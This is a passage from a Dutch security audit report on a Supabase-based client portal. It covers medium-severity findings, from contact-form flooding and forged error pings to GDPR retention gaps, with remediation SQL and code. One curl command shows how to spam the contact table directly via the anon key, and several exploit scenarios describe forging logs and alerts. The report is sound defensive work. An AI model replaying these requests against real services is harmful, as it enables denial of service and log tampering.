**Probleem.** Het formulier is publiek, heeft een honeypot en een rate limit van 5 per 10 minuten per IP — maar geen CAPTCHA of proof-of-work. Via HIGH-02 is de IP-limiet te omzeilen. De DB-policy `anyone can submit contact form` staat `INSERT TO anon` toe met alleen lengte-checks, dus een aanvaller kan de tabel ook rechtstreeks via de anon-key vullen, volledig buiten de applicatie-rate-limit om.

Elke inzending stuurt bovendien een Telegram-notificatie (`contact.functions.ts:57-60`).

**Exploitscenario.** Een aanvaller schrijft rechtstreeks naar PostgREST:
```bash
curl -X POST 'https://<ref>.supabase.co/rest/v1/contact_submissions' \
  -H "apikey: <anon-key>" -H "Content-Type: application/json" \
  -d '{"name":"x","email":"x@x.nl","message":"<5000 tekens>"}'
```
Herhaald: de tabel groeit onbeperkt, de admin-inbox raakt onbruikbaar, en de Telegram-bot wordt geflood.

**Impact.** Denial of service op het supportkanaal en onbegrensde databasegroei. Geen datalek.

**Fix, twee lagen.**

*Database* — voeg een rate limit toe in de policy zelf:
```sql
-- Applicatie-rate-limiting wordt omzeild door direct op PostgREST te posten.
DROP POLICY IF EXISTS "anyone can submit contact form" ON public.contact_submissions;

CREATE POLICY "anyone can submit contact form" ON public.contact_submissions
  FOR INSERT TO anon, authenticated
  WITH CHECK (
    length(name) BETWEEN 1 AND 200
    AND length(email) BETWEEN 3 AND 255
    AND length(message) BETWEEN 1 AND 5000
    AND (SELECT count(*) FROM public.contact_submissions
         WHERE created_at > now() - interval '10 minutes') < 50
  );
```

*Applicatie* — voeg een CAPTCHA toe (Cloudflare Turnstile is gratis en privacyvriendelijk) op het contactformulier en op de website-checker. Fix daarnaast HIGH-02, anders blijft de IP-limiet omzeilbaar.

**Hersteltijd:** 2 uur inclusief CAPTCHA-integratie.

---

#### MED-08 — `/api/public/site-error` accepteert een willekeurige `user_id`

**Locatie:** `src/routes/api/public/site-error.ts:41-51`; aanroep in `src/routes/__root.tsx:66`

**Probleem.** Het endpoint is ongeauthenticeerd en de client stuurt zelf de `user_id` mee. Er wordt gecontroleerd of die UUID bij een bestaand profiel hoort, maar niet of de indiener die gebruiker ís. De UID staat bovendien publiek in het tracking-script op de klantsite (`track[.]js.tsx:20`).

**Exploitscenario.** Een aanvaller leest de UID van een klant uit de view-source van diens website en post vervolgens verzonnen foutmeldingen op naam van die klant. Die verschijnen in het portal-dashboard van de klant (`portal.functions.ts:43-48`) en in het Alerts-scherm van de admin. Rate limit is 5 per 10 minuten per IP, maar via HIGH-02 omzeilbaar.

**Impact.** Vervuiling van het foutenlog en van de monitoringsignalen. Een echte storing verdwijnt in de ruis, of er wordt een niet-bestaande storing gemeld. Geen XSS: de waarden worden als JSX-tekst gerenderd, dus React escapet ze.

Hetzelfde patroon geldt voor `/api/public/site-ping` (`site-ping.ts:40-50`): een bekende UID volstaat om `status_ok: false` te melden en zo een vals uptime-alert te forceren. Daar zit wel een extra limiet van 12 per 5 minuten per user_id.

**Impact-nuance.** Dit is inherent aan een publiek tracking-endpoint met een client-side identifier. Volledig dichtzetten kan alleen met een gedeeld geheim per klant.

**Fix.** Geef elke klant een tracking-secret in plaats van alleen een UID:

```sql
ALTER TABLE public.profiles
  ADD COLUMN tracking_secret text NOT NULL DEFAULT encode(gen_random_bytes(16), 'hex');
```
Neem dat secret op in het gegenereerde `track.js` (dat script staat toch al alleen op de site van de klant zelf), en verifieer het server-side in beide endpoints vóór de insert. Dat verandert het aanvalsoppervlak van "iedereen die view-source doet" naar "iedereen die het script van die specifieke klant heeft gelezen" — een verbetering, geen sluitende oplossing.

**Hersteltijd:** 2 uur.

---

#### MED-09 — Klanten kunnen `login_events` vervalsen

**Locatie:** policy `20260523213826:46`; aanroep in `src/lib/portal.functions.ts:232-242`

**Probleem.** De policy `users insert own login_events` staat `INSERT` toe met alleen `WITH CHECK (user_id = auth.uid())`. De kolommen `ip` en `user_agent` zijn niet gepind en worden door de client aangeleverd. Er is geen rate limit en geen CHECK-constraint.

**Exploitscenario.** Een klant schrijft in een lus duizenden `login_events` met verzonnen IP-adressen en user-agents. Het overzicht in `adminListLoginEvents` (`admin.functions.ts:1029`) toont alleen de laatste 5, dus de echte login-historie is met tien inzendingen al onvindbaar. Bij een incidentonderzoek is de logregel niet meer te vertrouwen: de klant kan altijd volhouden dat de gelogde login niet van hem was.

**Impact.** Log-injectie die forensisch onderzoek onbruikbaar maakt. Ook onbegrensde tabelgroei.

**Fix.** Schrijf `login_events` uitsluitend server-side. `logLogin` (`portal.functions.ts:226`) gebruikt op regel 255-281 al `supabaseAdmin`, dus de klant-INSERT-policy is niet nodig:

```sql
-- De client hoort geen loginhistorie te kunnen schrijven: ip en user_agent zijn
-- dan vrij invulbaar en het log is forensisch waardeloos.
DROP POLICY IF EXISTS "users insert own login_events" ON public.login_events;
```

Zet in `logLogin` bovendien het IP uit `getClientIp(request)` in plaats van uit de client-payload, indien dat nu niet al gebeurt.

**Hersteltijd:** 30 minuten.

---

#### MED-10 — Geen bewaartermijnen op tabellen met persoonsgegevens

**Locatie:** projectbreed; enige retentie is `cleanup_old_website_checks` (`20260823120000:27-50`)

**Probleem.** Er is één cleanup-job in het hele project, en die dekt alleen `website_checks`. Zonder retentie groeien deze tabellen onbeperkt:

| Tabel | Inhoud | Groei |
|---|---|---|
| `login_events` | **IP-adres + user-agent per login** | Per login |
| `contact_submissions` | Naam, e-mail, vrij bericht | Per inzending |
| `site_pings` | Per klant per minuut | ~1440/dag/klant |
| `site_errors` | Foutmelding + volledige URL | Per fout |
| `chat_messages` | Volledige supportgesprekken | Per bericht |
| `telegram_pending_logins` | **Sessietokens** (zie HIGH-08) | Per login |
| `rate_limit_hits` / `rate_limit_bans` | IP-adressen | Per request |
| `audit_log` | Adminacties incl. e-mailadressen | Per actie |
| `leads` | Acquisitiedata van derden | Per import |

Het privacybeleid belooft expliciet dat contactformulierberichten maximaal 12 maanden bewaard worden (`privacybeleid.tsx:64-68`). Dat is niet geïmplementeerd; feitelijk is de bewaartermijn oneindig. Dat is een aantoonbare afwijking tussen wat je publiceert en wat je doet.

**Impact.** AVG-overtreding op het beginsel van opslagbeperking, plus een aantoonbaar onjuiste privacyverklaring. Daarnaast onbegrensde databasegroei en oplopende kosten.

**Fix.** Eén functie met een cron-job:

```sql
CREATE OR REPLACE FUNCTION public.enforce_retention()
RETURNS void
LANGUAGE sql SECURITY DEFINER SET search_path = public
AS $$
  DELETE FROM public.login_events        WHERE created_at < now() - interval '6 months';
  DELETE FROM public.contact_submissions WHERE created_at < now() - interval '12 months';
  DELETE FROM public.site_pings          WHERE created_at < now() - interval '30 days';
  DELETE FROM public.site_response_times WHERE created_at < now() - interval '90 days';
  DELETE FROM public.site_errors         WHERE created_at < now() - interval '90 days';
  DELETE FROM public.rate_limit_hits     WHERE reset_at  < now() - interval '1 day';
  DELETE FROM public.rate_limit_bans     WHERE banned_until < now() - interval '30 days';
  DELETE FROM public.monitoring_alerts   WHERE created_at < now() - interval '12 months';
$$;

REVOKE EXECUTE ON FUNCTION public.enforce_retention() FROM PUBLIC, anon, authenticated;

SELECT cron.schedule('enforce-retention', '30 3 * * *', $$SELECT public.enforce_retention();$$);
```

Controleer de kolomnamen (`reset_at`, `banned_until`) tegen `20260717150000` vóór toepassing. `audit_log` en `chat_messages` bewust niet opgenomen: daarvoor moet je eerst een bewaartermijn vaststellen en die in het privacybeleid opnemen.

**Hersteltijd:** 1 uur, plus een beleidsbesluit over de termijnen.

---

#### MED-11 — Accountverwijdering is onvolledig en niet transactioneel

**Locatie:** `src/lib/accounts.server.ts:65-84` (`adminHardDeleteUserImpl`)

**Probleem.** De functie doet 13 losse deletes gevolgd door `auth.admin.deleteUser`, zonder transactie. Faalt er één halverwege, dan blijft het account half verwijderd achter.

Belangrijker: er blijven aantoonbaar persoonsgegevens staan in tabellen die de code elders wél met een `user_id` vult maar hier niet aanraakt:

| Tabel | Wat blijft staan |
|---|---|
| `chats` / `chat_messages` | Volledige supportgesprekken |
| `password_reset_requests` | **`user_email` en `user_name`** — naam en e-mail van de verwijderde persoon |
| `purchase_requests` | Aankoopverzoeken |
| `site_response_times`, `monitoring_alerts` | Monitoringdata per user_id |
| `project_members` | Projectlidmaatschap |
| `audit_log` | Rijen met `target_id = userId` en `details.email` |

Wel goed geregeld: de `telegram_*`-tabellen hebben `ON DELETE CASCADE` op `profiles(id)` (`supabase-telegram-migration.sql:64`), dus die gaan mee.

**Exploitscenario.** Geen aanval — dit is een compliancerisico. Bij een verwijderverzoek onder artikel 17 AVG verklaart de organisatie dat de gegevens gewist zijn, terwijl naam en e-mailadres in `password_reset_requests` blijven staan en de volledige chatgeschiedenis behouden blijft.

**Impact.** Het recht op vergetelheid wordt niet volledig ingelost. Bij een klacht bij de AP is dat aantoonbaar met een enkele query.

**Fix.** Verplaats de verwijdering naar één `SECURITY DEFINER`-functie zodat hij transactioneel is, en vul de ontbrekende tabellen aan:

```sql
CREATE OR REPLACE FUNCTION public.hard_delete_user(p_user_id uuid)
RETURNS void
LANGUAGE plpgsql SECURITY DEFINER SET search_path = public
AS $$
BEGIN
  -- Losse deletes vanuit de applicatie zijn niet transactioneel: faalt er één,
  -- dan blijft het account half verwijderd achter met PII in de rest.
  DELETE FROM public.chat_messages WHERE chat_id IN
    (SELECT id FROM public.chats WHERE client_id = p_user_id);
  DELETE FROM public.chats                  WHERE client_id = p_user_id;
  DELETE FROM public.password_reset_requests WHERE user_id = p_user_id;
  DELETE FROM public.purchase_requests       WHERE user_id = p_user_id;
  DELETE FROM public.site_response_times     WHERE user_id = p_user_id;
  DELETE FROM public.monitoring_alerts       WHERE user_id = p_user_id;
  DELETE FROM public.project_members         WHERE user_id = p_user_id;
  DELETE FROM public.user_custom_roles       WHERE user_id = p_user_id;
  -- ... plus de 13 bestaande deletes uit accounts.server.ts:65-83
  DELETE FROM public.profiles                WHERE id = p_user_id;
END;
$$;

REVOKE EXECUTE ON FUNCTION public.hard_delete_user(uuid) FROM PUBLIC, anon, authenticated;
```

Roep die aan vanuit `adminHardDeleteUserImpl`, gevolgd door `auth.admin.deleteUser`. Beslis apart wat er met `audit_log` gebeurt — daar is een bewaarbelang, maar dat moet dan wel in het privacybeleid staan.

**Hersteltijd:** 3 uur.

---

#### MED-12 — Privacyverklaring komt niet overeen met wat de code doet

**Locatie:** `src/routes/privacybeleid.tsx:45-51`, `:64-68`, `:72-77`

**Probleem.** Drie aantoonbare afwijkingen:

1. **§2 "Welke gegevens"** noemt alleen naam, e-mail, inloggegevens en berichten. Ontbreekt: **IP-adres en user-agent bij elke login** (`login_events`, `portal.functions.ts:238-242`), telefoon, adres, factuuradres, KVK, BTW-nummer, Telegram chat_id en username, `last_seen_at`, monitoringdata met volledige URL's, chatgesprekken, en de contactgegevens van derde contactpersonen die de klant invoert.

2. **§4 "Bewaartermijnen"** belooft dat contactformulierberichten maximaal 12 maanden bewaard worden. Niet geïmplementeerd (zie MED-10).

3. **§5 "Derden"** noemt uitsluitend Supabase. Niet genoemd, terwijl de code ze aantoonbaar gebruikt: **Telegram** (naam, e-mail en het volledige contactbericht gaan erheen, `contact.functions.ts:57-60`; klantnaam en bedrijf bij changes, `telegram.server.ts:333-335`), **Hetzner** (hosting), **Calendly** (iframe en script, `server.ts:112,120,121`), en de **SMTP-provider** (`email.server.ts:15-23`). Er is geen doorgifte-buiten-EER-paragraaf terwijl Telegram dat wel is.

Correct: Google wordt terecht niet genoemd — er zit geen Google-tracking in de code (gecontroleerd, geen GA/GTM/Pixel).

**Impact.** Informatieplicht onder artikel 13 AVG niet volledig ingevuld, en een gepubliceerde bewaartermijn die feitelijk niet wordt nageleefd.

**Fix.** Werk `privacybeleid.tsx` bij: vul de gegevenscategorieën aan, neem alle vier de ontbrekende verwerkers op met vermelding van doorgifte buiten de EER voor Telegram, en breng de bewaartermijnen in lijn met de retentie-implementatie uit MED-10. Voeg een paragraaf over dataportabiliteit toe (zie LOW-11). Sluit verwerkersovereenkomsten met Hetzner en de SMTP-provider indien nog niet aanwezig — **handmatig verifiëren**.

**Hersteltijd:** 3 uur, inclusief juridische controle.

---

#### MED-13 — De permissiematrix wordt bij 89 van de 96 admin-functies niet gehandhaafd

**Locatie:** `src/lib/permissions.server.ts:11-15` (het gedocumenteerde patroon), toegepast bij slechts 7 functies

**Probleem.** SEC-2 introduceerde `ensurePermission` zodat de `role_permissions`-matrix ook server-side geldt. Dat patroon is toegepast op 7 functies: `adminSoftDeleteChange`, `adminBulkSoftDelete`, `adminRestoreChange`, `adminHardDeleteChange`, `adminChangeAccountRole`, `adminAssignCustomRole`, `adminRemoveCustomRole`. De andere 89 hebben alleen de hardcoded rolcheck.

Gevolg: een permissie uitzetten in de matrix-UI heeft voor die 89 functies geen enkel effect. Concrete gevallen waar de UI en de werkelijkheid uiteenlopen:

| Permissie | Functie zonder handhaving |
|---|---|
| `force_paid` | `adminToggleRequestPaid` (`admin.functions.ts:560`) |
| `export_csv` | `adminExportProjectTimeEntriesCsv` (`:2404`) |
| `create_change_for_customer` | `adminCreateChangeForCustomer` (`:1357`) |
| `manage_customers` | `adminUpdateCustomer` (`:102`) |
| `edit_change_status` | `adminUpdateRequestStatus` (`:345`) |
| `manage_team` | `adminChangeRole` (`:1196`) — terwijl de tweelingfunctie hem wél heeft |

**Exploitscenario.** Een super_admin zet `force_paid` uit voor `co_admin`, in de veronderstelling dat die daarmee geen wijzigingen meer op betaald kan zetten. De knop verdwijnt uit de UI. De `co_admin` roept de server function rechtstreeks aan en de actie slaagt gewoon.

**Impact.** De rollen- en permissiemodule wekt een schijnzekerheid. Het effect is een verkeerd beeld van wie wat mag, niet een directe escalatie — de hardcoded rolcheck houdt stand.

**Fix.** Voeg `ensurePermission` toe aan alle mutaties waarvoor een permissie-key bestaat, volgens het patroon dat al op `admin.functions.ts:1261` staat:

```ts
await ensureAdmin(context.supabase, context.userId);
await ensurePermission(context.supabase, context.userId, "force_paid");
```

Prioriteer de zes in de tabel hierboven. Documenteer expliciet welke permissie-keys géén server-side handhaving hebben, zodat de UI daar geen toggle voor toont.

**Hersteltijd:** 4 uur voor alle relevante functies; 1 uur voor de zes uit de tabel.

---

#### MED-14 — Wachtwoordbeleid is zwak en tijdelijke wachtwoorden gaan plaintext per e-mail

**Locatie:** `src/lib/admin.functions.ts:741-751` (`adminSetPassword`, `z.string().min(8)`); `src/lib/email.server.ts:76` en `:114`

**Probleem.** De enige eis aan een wachtwoord is een minimumlengte van 8 tekens. Er is geen complexiteitseis, geen controle tegen bekende gelekte wachtwoorden, en geen `must_change_password`-vlag. Het tijdelijke wachtwoord dat bij accountaanmaak wordt gegenereerd, wordt in zowel de HTML- als de tekstversie van de welkomstmail meegestuurd.

**Exploitscenario.** E-mail is geen vertrouwelijk kanaal: het bericht passeert meerdere servers en blijft doorgaans jarenlang in de mailbox van de ontvanger staan. Omdat er geen wijzigingsplicht is, blijft het toegestuurde wachtwoord in de praktijk vaak jarenlang geldig. Wie later toegang krijgt tot die mailbox — of tot een backup ervan — heeft daarmee een werkend accountwachtwoord. Via CRIT-03 is dat direct genoeg om in te loggen.

**Impact.** Verhoogde kans op accountovername via een kanaal buiten de applicatie om.

**Fix.**

1. Verhoog de eis en gebruik Supabase's ingebouwde controle. In het dashboard: minimumlengte 12, en zet "Check against HaveIBeenPwned" aan. **Handmatig te configureren.**
2. Stuur geen wachtwoord meer per e-mail. Vervang de welkomstmail door een eenmalige uitnodigingslink:
   ```ts
   // email.server.ts — in plaats van tempPassword
   // Een wachtwoord per e-mail blijft jaren in de mailbox staan en is daarmee
   // een permanente sleutel. Een eenmalige link verloopt.
   const { data } = await supabaseAdmin.auth.admin.generateLink({
     type: "invite",
     email: to,
   });
   // verstuur data.properties.action_link in plaats van het wachtwoord
   ```
3. Verhoog `min(8)` naar `min(12)` in `adminSetPassword`.

**Hersteltijd:** 2 uur.

---

#### MED-15 — Kwetsbare `undici` in de build-keten

**Locatie:** `node_modules/miniflare/node_modules/undici` (versie 7.28.0)

**Probleem.** `npm audit` meldt 12 kwetsbaarheden (7 high, 5 moderate). Belangrijk onderscheid, dat de kale auditoutput niet maakt:

- **De runtime-`undici` is 7.29.0 en is níet kwetsbaar.** Dat is de versie die de Website Checker gebruikt (`website-checker.server.ts:1`). Geverifieerd met `require('undici/package.json').version`.
- De kwetsbare 7.28.0 zit genest onder `miniflare`, dat via `@cloudflare/vite-plugin` en `nitro` → `env-runner` in de boom hangt. Die keten draait alleen tijdens de build, niet in productie.
- Daarnaast `sharp` met vier libvips-CVE's, eveneens via `miniflare`.

De advisories op undici 7.28.0 (request smuggling via de retry-interceptor, cache-poisoning via `Cache-Control`-parsing, CRLF-injectie via blob `type`) zijn ernstig, maar niet bereikbaar vanuit productiecode.

**Exploitscenario.** Vereist compromittering van de build-omgeving of van een van de betrokken packages. Geen pad vanaf het internet naar de draaiende applicatie.

**Impact.** Laag in de huidige opstelling. Wel relevant dat `@cloudflare/vite-plugin` en `wrangler` als dependencies aanwezig zijn terwijl er met `NITRO_PRESET=node_server` naar een node-server wordt gedeployd (`scripts/deploy.sh:27`) — die keten lijkt overbodig.

**Fix.**
1. Controleer of `@cloudflare/vite-plugin` en `wrangler` nog nodig zijn. Zo niet, verwijder ze plus `wrangler.jsonc`; dat laat vermoedelijk het overgrote deel van de 12 meldingen verdwijnen.
2. Draai `npm audit fix` (zonder `--force`) voor de niet-brekende updates.
3. Vermijd `npm audit fix --force`: dat installeert `nitro@0.0.0` en breekt de build.
4. Neem `npm audit --omit=dev` op in de deploy-pipeline als poortwachter voor productie-dependencies.

Positief: `package-lock.json` is aanwezig en gecommit, en er zijn geen verdachte `postinstall`-scripts in de directe dependencies.

**Hersteltijd:** 1 uur.

---

#### MED-16 — Cross-project milestone-dependencies en ongebruikte `project_id`-filters

**Locatie:** `src/lib/admin.functions.ts:2470-2492` (`adminAddMilestoneDependency`), en het patroon in `:2000, 2118, 2298, 2390, 2500`

**Probleem.** `adminAddMilestoneDependency` inserteert `milestone_id` en `depends_on_milestone_id` zonder te controleren dat beide bij `data.project_id` horen. Breder patroon: bij alle `admin*Update`- en `admin*Delete`-functies met een `(id, project_id)`-paar wordt `project_id` alleen gelogd en nooit als filter in de query gebruikt — er staat consequent `.eq("id", id)` zonder `.eq("project_id", project_id)`.

**Exploitscenario.** Een admin legt per ongeluk of bewust een dependency tussen milestones uit twee verschillende projecten. `adminUpdateProjectMilestone` (regel 1888-1895) gebruikt die vervolgens als blocker en toont de titel van een milestone uit het andere project. Bij een projectomgeving met meerdere klanten lekt daarmee een titel over de projectgrens heen.

**Impact.** Data-integriteit en een klein informatielek binnen het staff-domein. Geen klantgerichte IDOR: alle betrokken functies staan achter `ensureAdmin` of `ensureStaff`.

**Fix.** Gebruik `project_id` als filter in plaats van alleen als logveld:

```ts
// admin.functions.ts:2470 — valideer dat beide milestones in hetzelfde project zitten
const { data: ms } = await supabaseAdmin
  .from("project_milestones")
  .select("id")
  .eq("project_id", data.project_id)
  .in("id", [data.milestone_id, data.depends_on_milestone_id]);
if ((ms ?? []).length !== 2) {
  throw new Error("Milestones horen niet bij dit project.");
}
```

En in alle update-/delete-functies met een `(id, project_id)`-paar:
```ts
.eq("id", id).eq("project_id", project_id)   // was: alleen .eq("id", id)
```

**Hersteltijd:** 1,5 uur.

---

#### MED-17 — Ontbrekende foreign keys op ongeveer twaalf `user_id`-kolommen

**Locatie:** o.a. `20260523183942`, `20260523190624`, `20260523213826`, `20260523223743`

**Probleem.** De volgende kolommen zijn `uuid NOT NULL` maar hebben geen foreign key naar `auth.users` of `profiles`: `change_attachments.user_id`, `change_comments.author_id`, `customer_costs.user_id`, `onboarding_items.user_id`, `client_contacts.user_id`, `login_events.user_id`, `site_pings.user_id`, `site_errors.user_id`, `appointments.user_id`, `password_reset_requests.user_id`, `extra_change_requests.user_id`, `audit_log.user_id`.

Daarnaast ontbreken constraints op privilege-relevante velden: `roles.base_role` is vrije `text` zonder CHECK of FK (`20260714090000:15`), en `role_permissions.role` en `.permission` zijn vrije `text` zonder FK naar `roles.key` respectievelijk de bekende permissie-keys (`supabase-migration.sql:60`).

**Exploitscenario.** Geen directe aanval. Het gevolg is dat wees-rijen na accountverwijdering blijven staan — precies het probleem uit MED-11, maar dan structureel: zonder FK met `ON DELETE CASCADE` moet elke verwijdering handmatig in de applicatiecode worden bijgehouden, en dat gaat mis. `client_contacts` bevat gespreksverslagen en `login_events` bevat IP-adressen, dus het gaat om persoonsgegevens.

Bij `role_permissions.role` heeft het ontbreken van een FK een tweede effect: een typefout (`'super-admin'` in plaats van `'super_admin'`) levert stil een rij op die nooit matcht, zonder foutmelding.

**Impact.** Data-integriteit en AVG-naleving op de lange termijn.

**Fix.** Ruim eerst de bestaande wees-rijen op, voeg dan de constraints toe:

```sql
-- Zonder FK moet elke verwijdering handmatig in de applicatiecode worden
-- bijgehouden; dat gaat mis en laat PII achter (zie MED-11).
DELETE FROM public.login_events
  WHERE user_id NOT IN (SELECT id FROM public.profiles);

ALTER TABLE public.login_events
  ADD CONSTRAINT login_events_user_id_fkey
  FOREIGN KEY (user_id) REFERENCES public.profiles(id) ON DELETE CASCADE;
```
Herhaal per tabel. Voor `audit_log` is `ON DELETE SET NULL` waarschijnlijk passender dan `CASCADE`, omdat je de auditregel wilt behouden — maak `user_id` dan nullable.

En voor de rolvelden:
```sql
ALTER TABLE public.role_permissions
  ADD CONSTRAINT role_permissions_permission_check
  CHECK (permission IN ('view_admin','view_all_changes','edit_change_status',
    'edit_change_fields','delete_change_soft','delete_change_hard','restore_change',
    'force_paid','create_change_for_customer','manage_customers','generate_invoice',
    'export_csv','view_audit_log','manage_team','chat_with_customers','leads_view',
    'leads_manage','website_links_view','website_links_manage','appointments_manage',
    'alerts_view'));
```
Houd die lijst gelijk aan `ALL_PERMISSION_ACTIONS` in `rbac.ts:45-67`.

**Hersteltijd:** 3 uur.

---

> **Status:** dit rapport is compleet t/m severity MEDIUM. De secties LOW, INFO, Quick wins, Handmatig verifiëren en de afvinklijst per fase zijn nog niet uitgeschreven — het werk daarvoor is wel gedaan.
